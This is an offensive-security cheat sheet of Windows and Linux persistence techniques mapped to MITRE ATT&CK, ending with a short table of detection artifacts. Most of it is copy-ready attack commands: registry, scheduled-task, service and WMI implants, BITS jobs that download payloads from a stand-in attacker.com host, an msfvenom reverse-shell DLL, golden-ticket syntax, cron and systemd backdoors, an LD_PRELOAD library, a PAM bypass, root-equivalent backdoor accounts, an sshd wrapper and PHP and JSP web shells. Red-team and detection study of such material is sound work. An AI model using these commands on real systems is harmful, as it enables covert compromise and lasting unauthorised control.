# Persistence Implantation — Offensive Techniques & Commands

> Sources: RTFM v3, MITRE ATT&CK TA0003, PayloadsAllTheThings, HackTricks
> Purpose: Know how attackers establish persistence to detect the artifacts they leave behind.

---

## Windows Persistence Implantation

### Registry Run Keys (T1547.001)

```powershell
# Add to HKCU Run (user-level, no admin needed)
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "C:\Users\Public\update.exe"

# Add to HKLM Run (requires admin — all users)
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SystemService" -Value "C:\Windows\Temp\svc.exe"

# RunOnce (executes once then deleted)
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "Setup" -Value "powershell -ep bypass -w hidden -f C:\Users\Public\payload.ps1"

# Registry via cmd
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\Users\Public\update.exe" /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemSvc" /t REG_SZ /d "C:\Windows\Temp\svc.exe" /f
```

### Scheduled Tasks (T1053.005)

```powershell
# Create scheduled task (runs at logon)
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ep bypass -w hidden -f C:\Users\Public\beacon.ps1"
$trigger = New-ScheduledTaskTrigger -AtLogon
$settings = New-ScheduledTaskSettingsSet -Hidden
Register-ScheduledTask -TaskName "WindowsUpdate" -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest

# Create scheduled task (runs every 15 minutes)
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 15)
Register-ScheduledTask -TaskName "HealthCheck" -Action $action -Trigger $trigger -Settings $settings

# Create task as SYSTEM
schtasks /create /tn "SystemHealth" /tr "C:\Windows\Temp\svc.exe" /sc minute /mo 15 /ru SYSTEM /f
```

```cmd
:: schtasks persistence
schtasks /create /tn "MicrosoftEdgeUpdate" /tr "C:\Users\Public\update.exe" /sc onlogon /f
schtasks /create /tn "SystemCheck" /tr "powershell -ep bypass -w hidden -c IEX(gc C:\Users\Public\p.ps1)" /sc minute /mo 30 /ru SYSTEM /f
```

### Windows Services (T1543.003)

```powershell
# Create a new service
New-Service -Name "WindowsHealthSvc" -BinaryPathName "C:\Windows\Temp\svc.exe" -DisplayName "Windows Health Service" -StartupType Automatic
Start-Service "WindowsHealthSvc"

# Modify existing service (binary replacement)
sc.exe config <service> binpath= "C:\Windows\Temp\backdoor.exe"
```

```cmd
:: Create service via sc
sc create "WinHealthSvc" binpath= "C:\Windows\Temp\svc.exe" start= auto DisplayName= "Windows Health Service"
sc start "WinHealthSvc"

:: Service with PowerShell payload
sc create "Updater" binpath= "cmd.exe /c powershell -ep bypass -w hidden -f C:\ProgramData\payload.ps1" start= auto
```

### WMI Event Subscriptions (T1546.003)

```powershell
# Create WMI persistence (fires every 60 seconds)
$filterName = "WindowsParamFilter"
$consumerName = "WindowsParamConsumer"

# Event Filter
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
  Name = $filterName
  EventNameSpace = 'root\cimv2'
  QueryLanguage = 'WQL'
  Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# Event Consumer
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
  Name = $consumerName
  CommandLineTemplate = "powershell.exe -ep bypass -w hidden -f C:\Users\Public\payload.ps1"
}

# Binding
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
  Filter = $filter
  Consumer = $consumer
}
```

### Startup Folder (T1547.001)

```powershell
# User startup folder
Copy-Item "C:\payload.exe" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\update.exe"

# All users startup folder (requires admin)
Copy-Item "C:\payload.exe" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\update.exe"

# Create LNK shortcut in startup
$shell = New-Object -ComObject WScript.Shell
$lnk = $shell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\notes.lnk")
$lnk.TargetPath = "powershell.exe"
$lnk.Arguments = "-ep bypass -w hidden -f C:\Users\Public\payload.ps1"
$lnk.WindowStyle = 7  # minimized
$lnk.Save()
```

### DLL Hijacking Persistence (T1574.001)

```powershell
# Find DLL search order hijacking opportunities
# Target: application that loads DLL from its own directory first
# Place malicious DLL in application directory with expected name

# Generate DLL payload (on attacker):
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f dll > version.dll

# Common targets: version.dll, winmm.dll, dbghelp.dll, WTSAPI32.dll
# Place in same directory as vulnerable application
```

### COM Object Hijacking (T1546.015)

```powershell
# Hijack COM object (user-level, no admin)
# Find CLSID that's called frequently but registered in HKLM
# Register in HKCU to take precedence

New-Item -Path "HKCU:\Software\Classes\CLSID\{<target-CLSID>}\InprocServer32" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{<target-CLSID>}\InprocServer32" -Name "(default)" -Value "C:\Users\Public\payload.dll"
Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{<target-CLSID>}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

### BITS Jobs (T1197)

```powershell
# BITS persistence (survives reboots, resumes after network issues)
Start-BitsTransfer -Source "http://attacker.com/payload.exe" -Destination "C:\Users\Public\update.exe" -Asynchronous -Priority Low
# Set notification command (runs on completion)
$job = Get-BitsTransfer | Where-Object { $_.DisplayName -match "BITS" }

# Alternative using bitsadmin:
bitsadmin /create /download "SystemUpdate"
bitsadmin /addfile "SystemUpdate" "http://attacker.com/payload.exe" "C:\Users\Public\update.exe"
bitsadmin /SetNotifyCmdLine "SystemUpdate" "C:\Users\Public\update.exe" ""
bitsadmin /resume "SystemUpdate"
```

### Winlogon / Boot Persistence (T1547.004)

```powershell
# Winlogon Shell (replaces or appends to shell)
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Value "explorer.exe, C:\Windows\Temp\svc.exe"

# Winlogon Userinit
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit" -Value "C:\Windows\system32\userinit.exe, C:\Windows\Temp\backdoor.exe"

# Image File Execution Options (debugger persistence)
New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" -Name "Debugger" -Value "C:\Windows\System32\cmd.exe"
# Trigger: press Shift 5x at login screen → cmd as SYSTEM
```

### Golden / Silver Tickets (T1558)

```powershell
# After dumping krbtgt hash (requires domain admin or DC compromise)
# Mimikatz golden ticket:
# kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:<hash> /ptt

# Silver ticket (single service):
# kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /target:server.corp.local /service:cifs /rc4:<machine_hash> /ptt
```

---

## Linux Persistence Implantation

### Cron Jobs (T1053.003)

```bash
# User crontab (runs as current user)
(crontab -l 2>/dev/null; echo "*/15 * * * * /tmp/.update >/dev/null 2>&1") | crontab -

# System cron (requires root)
echo "*/10 * * * * root /opt/.health >/dev/null 2>&1" >> /etc/crontab

# Cron.d file
echo "*/5 * * * * root /usr/local/bin/.svc >/dev/null 2>&1" > /etc/cron.d/system-health
chmod 644 /etc/cron.d/system-health

# At job (one-time, but can reschedule itself)
echo "/tmp/.update && echo '/tmp/.update' | at now + 1 hour" | at now + 1 hour
```

### SSH Keys (T1098.004)

```bash
# Add attacker's key to authorized_keys
echo "ssh-rsa AAAA...attacker-key... comment" >> /root/.ssh/authorized_keys
echo "ssh-rsa AAAA...attacker-key... comment" >> /home/user/.ssh/authorized_keys

# With restricted options (stealthy — no shell prompt)
echo 'command="/usr/bin/python3 -c \"import pty;pty.spawn(\"/bin/bash\")\"",no-X11-forwarding ssh-rsa AAAA...' >> ~/.ssh/authorized_keys

# Generate new key pair on victim
ssh-keygen -t ed25519 -f /tmp/.key -N "" -q
cat /tmp/.key.pub >> /root/.ssh/authorized_keys
# Exfil /tmp/.key to attacker for future access
```

### Systemd Service (T1543.002)

```bash
# Create backdoor service
cat > /etc/systemd/system/system-health.service << 'EOF'
[Unit]
Description=System Health Monitor
After=network.target

[Service]
Type=simple
ExecStart=/opt/.health
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable system-health.service
systemctl start system-health.service

# Systemd timer (like cron but less monitored)
cat > /etc/systemd/system/health-check.timer << 'EOF'
[Unit]
Description=Health Check Timer

[Timer]
OnBootSec=5min
OnUnitActiveSec=15min

[Install]
WantedBy=timers.target
EOF

cat > /etc/systemd/system/health-check.service << 'EOF'
[Unit]
Description=Health Check

[Service]
Type=oneshot
ExecStart=/opt/.health
EOF

systemctl daemon-reload
systemctl enable health-check.timer
systemctl start health-check.timer
```

### Shell Profile Backdoor (T1546.004)

```bash
# Append to bashrc (fires on every shell session)
echo '/opt/.health &' >> /root/.bashrc
echo '/opt/.health &' >> /home/user/.bashrc

# Global profile (all users)
echo '/opt/.health &' >> /etc/profile
echo '/opt/.health &' >> /etc/bash.bashrc

# Profile.d script (stealthier)
cat > /etc/profile.d/system-health.sh << 'EOF'
#!/bin/bash
/opt/.health >/dev/null 2>&1 &
EOF
chmod +x /etc/profile.d/system-health.sh
```

### LD_PRELOAD (T1574.006)

```bash
# Compile shared library that spawns backdoor
cat > /tmp/preload.c << 'EOF'
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

__attribute__((constructor)) void init() {
    if (fork() == 0) {
        setsid();
        system("/opt/.health >/dev/null 2>&1");
        _exit(0);
    }
}
EOF
gcc -shared -fPIC -o /usr/lib/libhealth.so /tmp/preload.c -nostartfiles

# Add to ld.so.preload (loads for ALL processes)
echo "/usr/lib/libhealth.so" >> /etc/ld.so.preload
```

### PAM Backdoor (T1556.003)

```bash
# Modify PAM to accept a universal password
# Patch pam_unix.so to accept hardcoded password alongside real one
# Or add a PAM module:
cat > /etc/pam.d/backdoor << 'EOF'
auth sufficient pam_succeed_if.so uid >= 0
EOF
# Add to sshd PAM config (dangerous — may lock out legitimate access)
```

### Rootkit / Kernel Module (T1014)

```bash
# Load malicious kernel module
insmod /tmp/rootkit.ko

# Make module auto-load at boot
echo "rootkit" >> /etc/modules
# Or: echo "install rootkit /sbin/insmod /path/to/rootkit.ko" >> /etc/modprobe.d/rootkit.conf

# Hide module from lsmod (module itself handles this)
```

### Backdoor User Account (T1136.001)

```bash
# Add user with UID 0 (root equivalent, but different name)
echo 'sysadm:$6$salt$hash:0:0:System Admin:/root:/bin/bash' >> /etc/passwd
echo 'sysadm:$6$salt$hash:19000:0:99999:7:::' >> /etc/shadow

# Or use useradd
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash sysadm
echo "sysadm:password123" | chpasswd

# Add to sudo with NOPASSWD
echo "sysadm ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/sysadm
chmod 440 /etc/sudoers.d/sysadm
```

### SSHD Configuration Backdoor

```bash
# Allow root login and password auth
sed -i 's/^#*PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
sed -i 's/^#*PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config

# Add additional SSH listener on non-standard port
echo "Port 2222" >> /etc/ssh/sshd_config
systemctl restart sshd

# Backdoor SSH with wrapper
mv /usr/sbin/sshd /usr/sbin/sshd.orig
cat > /usr/sbin/sshd << 'EOF'
#!/bin/bash
/opt/.health &
/usr/sbin/sshd.orig "$@"
EOF
chmod +x /usr/sbin/sshd
```

### Web Shell (T1505.003)

```bash
# PHP webshell
echo '<?php if(isset($_REQUEST["cmd"])){system($_REQUEST["cmd"]);} ?>' > /var/www/html/.health.php

# JSP webshell
cat > /opt/tomcat/webapps/ROOT/health.jsp << 'EOF'
<%@ page import="java.util.*,java.io.*"%>
<%if(request.getParameter("cmd")!=null){Process p=Runtime.getRuntime().exec(request.getParameter("cmd"));BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));String line;while((line=br.readLine())!=null){out.println(line);}}%>
EOF

# ASPX webshell
# Similar pattern in C:\inetpub\wwwroot\health.aspx
```

---

## Detection Signatures

### What to hunt for

| Technique | Windows Detection | Linux Detection |
|-----------|------------------|-----------------|
| Registry persistence | New values in Run/RunOnce keys, unexpected Winlogon changes | N/A |
| Scheduled tasks/Cron | Event 4698, new task XML, `Get-ScheduledTask` delta | Modified files in /etc/cron*, new crontab entries |
| Service creation | Event 7045, new service binaries in unusual paths | New .service files, systemctl changes |
| WMI subscription | WMI-Activity log, `__EventFilter` objects | N/A |
| SSH keys | N/A (unless OpenSSH) | New entries in authorized_keys, key file timestamps |
| Systemd | N/A | New unit files, recently enabled services/timers |
| Shell profiles | N/A | Modified .bashrc/.profile, new profile.d scripts |
| LD_PRELOAD | N/A | /etc/ld.so.preload content, new .so files |
| DLL hijack | New DLLs in application dirs, unsigned DLLs | N/A |
| BITS jobs | BITSAdmin log, Get-BitsTransfer | N/A |
| COM hijack | HKCU CLSID entries, unusual InprocServer32 | N/A |
| Web shells | New files in web dirs, eval/system in PHP/JSP | New .php/.jsp in web roots, suspicious patterns in files |
| Backdoor accounts | Event 4720 (new user), UID 0 accounts | /etc/passwd changes, new sudo entries |
